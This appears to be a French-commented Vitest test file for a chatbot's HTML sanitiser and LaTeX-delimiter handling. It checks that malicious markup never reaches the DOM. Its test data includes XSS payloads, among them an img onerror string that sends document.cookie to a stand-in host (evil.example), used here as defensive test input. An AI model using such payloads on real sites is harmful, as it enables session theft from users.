// ── mathrender.js::sanitizeChatHtml/setRenderedHtmlContent — durcissement
// production : marked.parse() (chatbot.js) ne neutralise jamais le HTML brut
// présent dans son entrée, donc c'est setRenderedHtmlContent qui doit garantir
// qu'aucun script/attribut dangereux n'atteint jamais le DOM réel, tout en
// laissant passer le HTML "de mise en forme" produit par marked (voir audit
// production, "Rendu Markdown" priorité 3).
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { sanitizeChatHtml, setRenderedHtmlContent, extractMathSegments, restoreMathSegments } from "../mathrender.js";

// Simule UNIQUEMENT la règle CommonMark pertinente (marked.js) : un antislash
// suivi de "(", ")", "[" ou "]" est un échappement — le rendu final ne
// contient plus l'antislash. C'est cette règle précise qui dévorait les
// délimiteurs "\(...\)"/"\[...\]" avant extractMathSegments/
// restoreMathSegments (chantier "rendu des formules", 2026-10-18) : pas
// besoin de la vraie bibliothèque marked pour le prouver, juste de sa règle
// d'échappement documentée (CommonMark §2.4).
function fakeMarkdownEscape(text) {
  return text.replace(/\\([()[\]])/g, "$1");
}

describe("sanitizeChatHtml", () => {
  afterEach(() => {
    delete window.DOMPurify;
  });

  it("neutralise un <img onerror=...> via DOMPurify quand il est chargé", () => {
    // Simule le vrai DOMPurify (chargé via CDN en production, absent en
    // environnement de test) : on vérifie que sanitizeChatHtml délègue
    // réellement à window.DOMPurify.sanitize plutôt que de faire sa propre
    // neutralisation partielle.
    window.DOMPurify = {
      sanitize: (html) => html.replace(/<img[^>]*>/gi, ""),
    };
    const dangerous = '<p>Bonjour</p><img src=x onerror="alert(document.cookie)">';
    expect(sanitizeChatHtml(dangerous)).toBe("<p>Bonjour</p>");
  });

  it("conserve le HTML de mise en forme normal (marked) via DOMPurify", () => {
    window.DOMPurify = { sanitize: (html) => html };
    const safe = "<p>Une <strong>puissance</strong>, c'est $2^3$.</p>";
    expect(sanitizeChatHtml(safe)).toBe(safe);
  });

  it("repli sûr (retrait de toutes les balises) si DOMPurify n'est pas chargé", () => {
    delete window.DOMPurify;
    const dangerous = '<img src=x onerror="alert(1)">Bonjour';
    const result = sanitizeChatHtml(dangerous);
    expect(result).not.toContain("<img");
    expect(result).not.toContain("onerror");
    expect(result).toContain("Bonjour");
  });

  it("jamais fail-open : sans DOMPurify, un <script> est aussi retiré", () => {
    delete window.DOMPurify;
    const dangerous = "<script>alert(1)</script>Bonjour";
    const result = sanitizeChatHtml(dangerous);
    expect(result).not.toContain("<script");
    expect(result).toContain("Bonjour");
  });

  it("chaîne vide/nulle renvoie une chaîne vide", () => {
    expect(sanitizeChatHtml("")).toBe("");
    expect(sanitizeChatHtml(null)).toBe("");
    expect(sanitizeChatHtml(undefined)).toBe("");
  });
});

describe("setRenderedHtmlContent", () => {
  let el;

  beforeEach(() => {
    el = document.createElement("div");
  });

  afterEach(() => {
    delete window.DOMPurify;
    delete window.renderMathInElement;
  });

  it("injecte le HTML sanitisé dans l'élément (jamais le HTML brut non filtré)", () => {
    window.DOMPurify = { sanitize: (html) => html.replace(/<img[^>]*>/gi, "[image retirée]") };
    setRenderedHtmlContent(el, '<p>Salut</p><img src=x onerror="alert(1)">');
    expect(el.innerHTML).toBe("<p>Salut</p>[image retirée]");
  });

  it("un message malveillant réaliste (payload XSS classique) ne produit aucune balise <img>/<script> dans le DOM final", () => {
    // Sans DOMPurify chargé (cas dégradé) : preuve que même le repli fail-safe
    // empêche toute balise dangereuse d'atteindre le DOM réel.
    const payload = "<p>Regarde ça</p><img src=x onerror=\"fetch('https://evil.example/steal?c='+document.cookie)\">";
    setRenderedHtmlContent(el, payload);
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector("script")).toBeNull();
    expect(el.innerHTML).toContain("Regarde ça");
  });
});

// ── Chantier "rendu des formules mathématiques" (2026-10-18) ───────────────
describe("extractMathSegments / restoreMathSegments", () => {
  function roundTrip(text) {
    const { text: protectedText, segments } = extractMathSegments(text);
    const afterMarkdown = fakeMarkdownEscape(protectedText);
    return restoreMathSegments(afterMarkdown, segments);
  }

  it("protège \\(...\\) (inline) de l'échappement Markdown des parenthèses", () => {
    const text = "Calcule \\(x^2 + 1\\) rapidement.";
    // Preuve que sans protection, l'échappement mangerait bien les antislashs
    // (c'est exactement le bug observé : du LaTeX brut, sans délimiteur).
    expect(fakeMarkdownEscape(text)).toBe("Calcule (x^2 + 1) rapidement.");
    expect(roundTrip(text)).toBe(text);
  });

  it("protège \\[...\\] (équation isolée) de l'échappement Markdown des crochets", () => {
    const text = "\\[AB=\\sqrt{3^2+4^2}=5\\]";
    expect(fakeMarkdownEscape(text)).toBe("[AB=\\sqrt{3^2+4^2}=5]");
    expect(roundTrip(text)).toBe(text);
  });

  it("multiplication (\\times)", () => {
    expect(roundTrip("On a \\(3 \\times 4 = 12\\).")).toBe("On a \\(3 \\times 4 = 12\\).");
  });

  it("racine carrée (\\sqrt)", () => {
    expect(roundTrip("\\(\\sqrt{25} = 5\\)")).toBe("\\(\\sqrt{25} = 5\\)");
  });

  it("fraction (\\frac)", () => {
    expect(roundTrip("\\(\\frac{1}{2}\\)")).toBe("\\(\\frac{1}{2}\\)");
  });

  it("vecteurs (\\vec et \\overrightarrow)", () => {
    expect(roundTrip("Le vecteur \\(\\vec{AB}\\) puis \\(\\overrightarrow{AB}\\).")).toBe(
      "Le vecteur \\(\\vec{AB}\\) puis \\(\\overrightarrow{AB}\\).",
    );
  });

  it("probabilités (P(A)) — ne confond pas une notation mathématique sans délimiteur avec une formule", () => {
    // "P(A)" seul (pas de \(...\)/$...$ autour) n'est jamais traité comme une
    // formule à protéger : section 4 de la consigne, jamais de transformation
    // arbitraire de texte ordinaire en LaTeX. Reste identique de bout en bout.
    const text = "On note P(A) la probabilité de l'évènement A.";
    expect(roundTrip(text)).toBe(text);
    expect(extractMathSegments(text).segments).toHaveLength(0);
  });

  it("legacy $...$/$$...$$ toujours reconnus (conversations déjà persistées)", () => {
    expect(roundTrip("Voici $x^2$ et $$y = mx + b$$.")).toBe("Voici $x^2$ et $$y = mx + b$$.");
  });

  it("plusieurs formules dans un même message, mélangeant les 4 conventions", () => {
    const text = "D'abord \\(a+b\\), puis $c-d$, puis \\[e \\times f\\] et enfin $$g \\div h$$.";
    expect(roundTrip(text)).toBe(text);
    expect(extractMathSegments(text).segments).toHaveLength(4);
  });

  it("texte normal contenant des antislashs (hors de toute formule) n'est jamais touché", () => {
    const text = "Le chemin est C:\\Users\\eleve, attention à bien l'écrire ainsi.";
    expect(extractMathSegments(text).segments).toHaveLength(0);
    expect(roundTrip(text)).toBe(text);
  });

  it("formule mal formée (délimiteur jamais fermé) : aucun plantage", () => {
    // Un délimiteur ouvrant jamais fermé n'est PAS une formule complète :
    // extractMathSegments ne peut rien protéger ici (rien à protéger tant
    // qu'il n'y a pas de fermeture) — le texte traverse alors le Markdown
    // normalement, avec le même comportement qu'avant ce chantier (ni
    // plantage, ni formule rendue à moitié). "Sans plantage" est ce que ce
    // test garantit, pas l'absence de toute dégradation d'un texte déjà mal
    // formé en amont.
    const text = "Regarde \\(x^2 sans fermeture et la suite du message.";
    expect(() => roundTrip(text)).not.toThrow();
    expect(extractMathSegments(text).segments).toHaveLength(0);
    expect(extractMathSegments(text).text).toBe(text);
  });

  it("une formule contenant accidentellement des caractères HTML reste du texte inerte (jamais de balise vivante)", () => {
    const html = restoreMathSegments("[[X]]", [{ placeholder: "[[X]]", original: "\\(a < b\\)" }]);
    expect(html).not.toContain("<b>");
    expect(html).toContain("&lt;");
  });

  it("chaîne vide/nulle ne plante jamais", () => {
    expect(extractMathSegments("")).toEqual({ text: "", segments: [] });
    expect(extractMathSegments(null)).toEqual({ text: "", segments: [] });
    expect(restoreMathSegments("<p>ok</p>", [])).toBe("<p>ok</p>");
  });
});

describe("renderMathIn (délimiteurs KaTeX configurés)", () => {
  afterEach(() => {
    delete window.renderMathInElement;
  });

  it("configure \\(...\\) et \\[...\\] en plus de $...$/$$...$$", () => {
    const seen = [];
    window.renderMathInElement = (el, opts) => {
      seen.push(opts);
    };
    const el = document.createElement("div");
    setRenderedHtmlContent(el, "<p>peu importe</p>");
    const delimiters = seen[0].delimiters;
    const pairs = delimiters.map((d) => `${d.left}${d.right}`);
    expect(pairs).toContain("\\(\\)");
    expect(pairs).toContain("\\[\\]");
    expect(pairs).toContain("$$$$");
    expect(pairs).toContain("$$");
    expect(seen[0].throwOnError).toBe(false);
  });
});
